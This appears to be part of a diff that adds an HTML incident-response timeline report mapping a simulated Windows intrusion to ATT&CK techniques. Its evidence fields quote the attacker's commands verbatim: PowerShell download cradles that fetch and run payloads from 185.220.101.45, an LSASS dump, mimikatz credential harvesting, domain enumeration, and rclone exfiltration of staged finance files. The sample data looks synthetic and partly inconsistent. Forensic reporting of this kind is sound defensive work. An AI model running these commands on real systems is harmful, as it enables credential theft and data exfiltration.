+    <div class="tl-evidence" id="ev-3107094864775780569" style="display:none"><div class="ev-line">→ Cmd: robocopy.exe \\srv-file01\finance c:\users\jsmith\appdata\local\temp\staging /e /copyall</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-3107094864775780569',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:41:07</div>
+  <div class="tl-dot" style="background:#e67e22"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#e67e22">Execution</div>
+    <div class="tl-tech">T1106 — Native API / Malware Process Chain <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Suspicious parent process spawned child.</div>
+    <div class="tl-evidence" id="ev-5143699718912295890" style="display:none"><div class="ev-line">→ Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</div><div class="ev-line">→ Child:  c:\users\jsmith\appdata\local\temp\rclone.exe</div><div class="ev-line">→ Cmd:    rclone.exe copy c:\users\jsmith\appdata\local\temp\staging remote:acme-backup --config c:\users\jsmith\appdata\local\tem</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-5143699718912295890',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:41:07</div>
+  <div class="tl-dot" style="background:#c0392b"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#c0392b">Exfiltration</div>
+    <div class="tl-tech">T1567 — Rclone cloud exfiltration tool <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Data exfiltration tool detected: rclone.exe.</div>
+    <div class="tl-evidence" id="ev-1053908058910203952" style="display:none"><div class="ev-line">→ Cmd: rclone.exe copy c:\users\jsmith\appdata\local\temp\staging remote:acme-backup --config c:\users\jsmith\appdata\local\temp\rclone.conf</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-1053908058910203952',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-medium">
+  <div class="tl-time">2024-03-15 17:41:07</div>
+  <div class="tl-dot" style="background:#c0392b"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#c0392b">Exfiltration</div>
+    <div class="tl-tech">T1567 — Rclone cloud exfiltration tool (Prefetch) 
+      <span class="conf-badge conf-medium">MEDIUM</span>
+    </div>
+    <div class="tl-desc">Exfiltration tool execution evidence in Prefetch: rclone.exe.</div>
+    <div class="tl-evidence" id="ev-2629034547564332225" style="display:none"><div class="ev-line">→ Path: C:\Users\jsmith\AppData\Local\Temp\rclone.exe</div><div class="ev-line">→ Run count: 1</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-2629034547564332225',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 17:41:10</div>
+  <div class="tl-dot" style="background:#2c3e50"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#2c3e50">Command and Control</div>
+    <div class="tl-tech">T1071 — Application Layer C2 Beaconing 
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Regular outbound connections from rclone.exe to 185.220.101.45:443 suggest C2 beaconing (avg interval: 120s, 6 connections).</div>
+    <div class="tl-evidence" id="ev-7157618457117550826" style="display:none"><div class="ev-line">→ Process:  C:\Users\jsmith\AppData\Local\Temp\rclone.exe</div><div class="ev-line">→ Dest:     185.220.101.45:443</div><div class="ev-line">→ Count:    6 connections</div><div class="ev-line">→ Interval: ~120s (σ=0.0s)</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-7157618457117550826',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-medium">
+  <div class="tl-time">2024-03-15 17:45:00</div>
+  <div class="tl-dot" style="background:#f39c12"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#f39c12">Lateral Movement</div>
+    <div class="tl-tech">T1110 — Brute Force / Credential Scanning <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-medium">MEDIUM</span>
+    </div>
+    <div class="tl-desc">4 logon failures in 9s — possible credential scanning.</div>
+    <div class="tl-evidence" id="ev-8003410071818005530" style="display:none"><div class="ev-line">→ Target IPs: 10.10.1.20, 10.10.1.21, 10.10.1.22, 10.10.1.23</div><div class="ev-line">→ Failure count: 4</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-8003410071818005530',this)">show evidence ▾</button>
+  </div>
+</div>
+<div class="tl-item conf-high">
+  <div class="tl-time">2024-03-15 18:02:44</div>
+  <div class="tl-dot" style="background:#7f8c8d"></div>
+  <div class="tl-content">
+    <div class="tl-phase" style="color:#7f8c8d">Defense Evasion</div>
+    <div class="tl-tech">T1562.001 — AV Warning (Defender) <span class="host-tag">DESKTOP-W7K2MNX</span>
+      <span class="conf-badge conf-high">HIGH</span>
+    </div>
+    <div class="tl-desc">Windows Defender generated a warning notification — review threat name.</div>
+    <div class="tl-evidence" id="ev-6609166000166389498" style="display:none"><div class="ev-line">→ EventID: 1116</div><div class="ev-line">→ Host: DESKTOP-W7K2MNX</div></div>
+    <button class="ev-btn" onclick="toggleEv('ev-6609166000166389498',this)">show evidence ▾</button>
+  </div>
+</div>
+  </div>
+  <div class="detail-col">
+    
+<section id="Initial_Access">
+  <h2 style="border-left:4px solid #c0392b;padding-left:12px">Initial Access
+    <span class="badge" style="background:#c0392b">1</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:47:45</div>
+  <div class="f-tech">T1566.001 — Phishing: Malicious Attachment
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Office application spawned a shell process — macro execution likely.</div>
+  <ul class="f-evidence"><li>Parent: c:\program files\microsoft office\root\office16\winword.exe</li><li>Child:  c:\windows\system32\cmd.exe</li><li>Cmd:    cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encoded</li></ul>
+</div>
+</section>
+<section id="Execution">
+  <h2 style="border-left:4px solid #e67e22;padding-left:12px">Execution
+    <span class="badge" style="background:#e67e22">12</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:47:52</div>
+  <div class="f-tech">T1059.001 — PowerShell
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious PowerShell execution with flags: EncodedCommand, NoProfile, WindowHidden.</div>
+  <ul class="f-evidence"><li>Cmd: powershell.exe -nop -w hidden -encodedcommand base64encoded</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:47:55</div>
+  <div class="f-tech">T1059.001 — PowerShell Download Cradle
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">PowerShell script block contains download cradle.</div>
+  <ul class="f-evidence"><li>Block: iex (new-object net.webclient).downloadstring("http://185.220.101.45/stager.ps1")</li><li>URL: http://185.220.101.45/stager.ps1</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:48:02</div>
+  <div class="f-tech">T1059.001 — PowerShell Download Cradle
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">PowerShell script block contains download cradle.</div>
+  <ul class="f-evidence"><li>Block: $url="http://185.220.101.45/payload.exe"; $out="$env:temp\svchost32.exe"; (new-object net.webclient).downloadfile($url,$out); start-process $out -argumentlist "-install"</li><li>URL: http://185.220.101.45/payload.exe</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:52:04</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\users\jsmith\appdata\local\temp\pd.exe</li><li>Cmd:    pd.exe -accepteula -ma lsass.exe c:\users\jsmith\appdata\local\temp\lsass.dmp</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:00</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\windows\system32\net.exe</li><li>Cmd:    net.exe group "domain admins" /domain</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:08</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\windows\system32\net.exe</li><li>Cmd:    net.exe user /domain</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:18</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\windows\system32\nltest.exe</li><li>Cmd:    nltest.exe /domain_trusts /all_trusts</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:25</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\windows\system32\nltest.exe</li><li>Cmd:    nltest.exe /dclist:acme.local</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:03:05</div>
+  <div class="f-tech">T1059.001 — PowerShell Download Cradle
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">PowerShell script block contains download cradle.</div>
+  <ul class="f-evidence"><li>Block: invoke-expression (new-object net.webclient).downloadstring("http://185.220.101.45/sharphound.ps1"); invoke-bloodhound -collectionmethod all</li><li>URL: http://185.220.101.45/sharphound.ps1</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:03:12</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\users\jsmith\appdata\local\temp\sharphound.exe</li><li>Cmd:    sharphound.exe -c all --domain acme.local --zipfilename bloodhound_acme.zip</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:35:18</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\windows\system32\robocopy.exe</li><li>Cmd:    robocopy.exe \\srv-file01\finance c:\users\jsmith\appdata\local\temp\staging /e /copyall</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:41:07</div>
+  <div class="f-tech">T1106 — Native API / Malware Process Chain
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Suspicious parent process spawned child.</div>
+  <ul class="f-evidence"><li>Parent: c:\users\jsmith\appdata\local\temp\svchost32.exe</li><li>Child:  c:\users\jsmith\appdata\local\temp\rclone.exe</li><li>Cmd:    rclone.exe copy c:\users\jsmith\appdata\local\temp\staging remote:acme-backup --config c:\users\jsmith\appdata\local\tem</li></ul>
+</div>
+</section>
+<section id="Persistence">
+  <h2 style="border-left:4px solid #8e44ad;padding-left:12px">Persistence
+    <span class="badge" style="background:#8e44ad">3</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:48:15</div>
+  <div class="f-tech">T1543.003 — New Windows Service
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">New service installed: winupdatehelper.</div>
+  <ul class="f-evidence"><li>Service: winupdatehelper</li><li>Binary:  c:\users\jsmith\appdata\local\temp\svchost32.exe -service</li><li>Start:   auto start</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:22:05</div>
+  <div class="f-tech">T1053.005 — Scheduled Task
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Scheduled task created: \microsoft\windows\updatecheck\winupdatesvc.</div>
+  <ul class="f-evidence"><li>Task: \microsoft\windows\updatecheck\winupdatesvc</li><li>Action path hint: suspicious user path</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:22:05</div>
+  <div class="f-tech">T1053.005 — Scheduled Task Registered
+    <span class="conf-badge conf-medium">MEDIUM</span>
+  </div>
+  <div class="f-desc">Scheduled task registered: \microsoft\windows\updatecheck\winupdatesvc.</div>
+  <ul class="f-evidence"><li>Task: \microsoft\windows\updatecheck\winupdatesvc</li><li>User: acme\jsmith</li></ul>
+</div>
+</section>
+<section id="Defense_Evasion">
+  <h2 style="border-left:4px solid #7f8c8d;padding-left:12px">Defense Evasion
+    <span class="badge" style="background:#7f8c8d">1</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 18:02:44</div>
+  <div class="f-tech">T1562.001 — AV Warning (Defender)
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Windows Defender generated a warning notification — review threat name.</div>
+  <ul class="f-evidence"><li>EventID: 1116</li><li>Host: DESKTOP-W7K2MNX</li></ul>
+</div>
+</section>
+<section id="Credential_Access">
+  <h2 style="border-left:4px solid #2980b9;padding-left:12px">Credential Access
+    <span class="badge" style="background:#2980b9">4</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:52:04</div>
+  <div class="f-tech">T1003 — OS Credential Dumping
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Known credential tool executed: Procdump — LSASS dump utility.</div>
+  <ul class="f-evidence"><li>Process: c:\users\jsmith\appdata\local\temp\pd.exe</li><li>Cmd: pd.exe -accepteula -ma lsass.exe c:\users\jsmith\appdata\local\temp\lsass.dmp</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:52:30</div>
+  <div class="f-tech">T1003.001 — LSASS Memory
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Handle requested to LSASS process — memory dump likely.</div>
+  <ul class="f-evidence"><li>Accessing process: c:\users\jsmith\appdata\local\temp\pd.exe</li><li>Access mask: 0x1410</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:03:05</div>
+  <div class="f-tech">T1059.001 — Malicious Script Block
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">PowerShell script block contains credential harvesting pattern: invoke-bloodhound.</div>
+  <ul class="f-evidence"><li>Block: invoke-expression (new-object net.webclient).downloadstring("http://185.220.101.45/sharphound.ps1"); invoke-bloodhound -collectionmethod all</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:20:11</div>
+  <div class="f-tech">T1059.001 — Malicious Script Block
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">PowerShell script block contains credential harvesting pattern: sekurlsa.</div>
+  <ul class="f-evidence"><li>Block: sekurlsa::logonpasswords</li></ul>
+</div>
+</section>
+<section id="Discovery">
+  <h2 style="border-left:4px solid #27ae60;padding-left:12px">Discovery
+    <span class="badge" style="background:#27ae60">5</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:00</div>
+  <div class="f-tech">T1069/T1087 — Account/Group Discovery
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Domain group/user enumeration via net.exe</div>
+  <ul class="f-evidence"><li>Cmd: net.exe group "domain admins" /domain</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:08</div>
+  <div class="f-tech">T1069/T1087 — Account/Group Discovery
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Domain group/user enumeration via net.exe</div>
+  <ul class="f-evidence"><li>Cmd: net.exe user /domain</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:18</div>
+  <div class="f-tech">T1069/T1087 — Account/Group Discovery
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Domain trust and DC enumeration via nltest.exe</div>
+  <ul class="f-evidence"><li>Cmd: nltest.exe /domain_trusts /all_trusts</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 16:55:25</div>
+  <div class="f-tech">T1069/T1087 — Account/Group Discovery
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Domain trust and DC enumeration via nltest.exe</div>
+  <ul class="f-evidence"><li>Cmd: nltest.exe /dclist:acme.local</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:03:12</div>
+  <div class="f-tech">T1087/T1482 — BloodHound AD Collection
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">BloodHound/SharpHound executed — full AD object collection for attack path analysis.</div>
+  <ul class="f-evidence"><li>Cmd: sharphound.exe -c all --domain acme.local --zipfilename bloodhound_acme.zip</li></ul>
+</div>
+</section>
+<section id="Lateral_Movement">
+  <h2 style="border-left:4px solid #f39c12;padding-left:12px">Lateral Movement
+    <span class="badge" style="background:#f39c12">5</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 17:15:33</div>
+  <div class="f-tech">T1550.002 — Use of Alternate Credentials
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Explicit credential logon to srv-file01 as svc_backup.</div>
+  <ul class="f-evidence"><li>Target user:   svc_backup</li><li>Target host:   srv-file01</li><li>Process used:  c:\windows\system32\mstsc.exe</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:16:03</div>
+  <div class="f-tech">T1021.001 — Remote Desktop Protocol
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+  <ul class="f-evidence"><li>User:    acme\svc_backup</li><li>Source:  10.10.1.55</li><li>EventID: 1149</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:16:05</div>
+  <div class="f-tech">T1021.001 — Remote Desktop Protocol
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+  <ul class="f-evidence"><li>User:    acme\svc_backup</li><li>Source:  10.10.1.55</li><li>EventID: 21</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:16:07</div>
+  <div class="f-tech">T1021.001 — Remote Desktop Protocol
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">RDP session from 10.10.1.55 as acme\svc_backup.</div>
+  <ul class="f-evidence"><li>User:    acme\svc_backup</li><li>Source:  10.10.1.55</li><li>EventID: 22</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:45:00</div>
+  <div class="f-tech">T1110 — Brute Force / Credential Scanning
+    <span class="conf-badge conf-medium">MEDIUM</span>
+  </div>
+  <div class="f-desc">4 logon failures in 9s — possible credential scanning.</div>
+  <ul class="f-evidence"><li>Target IPs: 10.10.1.20, 10.10.1.21, 10.10.1.22, 10.10.1.23</li><li>Failure count: 4</li></ul>
+</div>
+</section>
+<section id="Collection">
+  <h2 style="border-left:4px solid #16a085;padding-left:12px">Collection
+    <span class="badge" style="background:#16a085">1</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 17:35:18</div>
+  <div class="f-tech">T1074 — Robocopy used for bulk file staging
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">File staging tool robocopy.exe executed.</div>
+  <ul class="f-evidence"><li>Cmd: robocopy.exe \\srv-file01\finance c:\users\jsmith\appdata\local\temp\staging /e /copyall</li></ul>
+</div>
+</section>
+<section id="Exfiltration">
+  <h2 style="border-left:4px solid #c0392b;padding-left:12px">Exfiltration
+    <span class="badge" style="background:#c0392b">3</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:47:58</div>
+  <div class="f-tech">T1048 — Exfiltration Over Alternative Protocol
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">60.0 MB sent to 185.220.101.45 via rclone.exe across 15 connections.</div>
+  <ul class="f-evidence"><li>Destination: 185.220.101.45</li><li>Total sent:  60.0 MB</li><li>Connections: 15</li><li>Process:     C:\Users\jsmith\AppData\Local\Temp\rclone.exe</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:41:07</div>
+  <div class="f-tech">T1567 — Rclone cloud exfiltration tool
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Data exfiltration tool detected: rclone.exe.</div>
+  <ul class="f-evidence"><li>Cmd: rclone.exe copy c:\users\jsmith\appdata\local\temp\staging remote:acme-backup --config c:\users\jsmith\appdata\local\temp\rclone.conf</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:41:07</div>
+  <div class="f-tech">T1567 — Rclone cloud exfiltration tool (Prefetch)
+    <span class="conf-badge conf-medium">MEDIUM</span>
+  </div>
+  <div class="f-desc">Exfiltration tool execution evidence in Prefetch: rclone.exe.</div>
+  <ul class="f-evidence"><li>Path: C:\Users\jsmith\AppData\Local\Temp\rclone.exe</li><li>Run count: 1</li></ul>
+</div>
+</section>
+<section id="Command_and_Control">
+  <h2 style="border-left:4px solid #2c3e50;padding-left:12px">Command and Control
+    <span class="badge" style="background:#2c3e50">2</span>
+  </h2>
+  
+<div class="finding">
+  <div class="f-time">2024-03-15 16:48:30</div>
+  <div class="f-tech">T1071 — Application Layer C2 Beaconing
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Regular outbound connections from svchost32.exe to 185.220.101.45:443 suggest C2 beaconing (avg interval: 300s, 8 connections).</div>
+  <ul class="f-evidence"><li>Process:  C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</li><li>Dest:     185.220.101.45:443</li><li>Count:    8 connections</li><li>Interval: ~300s (σ=0.0s)</li></ul>
+</div>
+<div class="finding">
+  <div class="f-time">2024-03-15 17:41:10</div>
+  <div class="f-tech">T1071 — Application Layer C2 Beaconing
+    <span class="conf-badge conf-high">HIGH</span>
+  </div>
+  <div class="f-desc">Regular outbound connections from rclone.exe to 185.220.101.45:443 suggest C2 beaconing (avg interval: 120s, 6 connections).</div>
+  <ul class="f-evidence"><li>Process:  C:\Users\jsmith\AppData\Local\Temp\rclone.exe</li><li>Dest:     185.220.101.45:443</li><li>Count:    6 connections</li><li>Interval: ~120s (σ=0.0s)</li></ul>
+</div>
+</section>
+  </div>
+</div>
+</body>
+</html>
